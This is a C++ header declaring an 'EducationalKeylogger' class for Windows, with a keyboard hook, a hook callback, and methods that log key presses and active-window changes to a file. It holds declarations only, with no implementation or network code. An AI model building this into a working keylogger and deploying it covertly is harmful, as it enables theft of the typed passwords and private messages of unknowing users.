#ifndef EDUCATIONAL_KEYLOGGER_H
#define EDUCATIONAL_KEYLOGGER_H

#include <string>
#include <fstream>
#include <map>
#include <windows.h>

class EducationalKeylogger {
private:
    HHOOK keyboardHook;
    std::ofstream logFile;
    std::string logFilename;
    static EducationalKeylogger* instance;
    
    std::map<int, std::string> keyMap;
    
    void initializeKeyMap();
    void setupLogFile();
    static LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    void logKeyPress(int vkCode);
    void logWindowChange();
    
public:
    EducationalKeylogger();
    ~EducationalKeylogger();
    
    bool startMonitoring();
    void stopMonitoring();
    std::string getLogContent() const;
    void clearLog();
};

#endif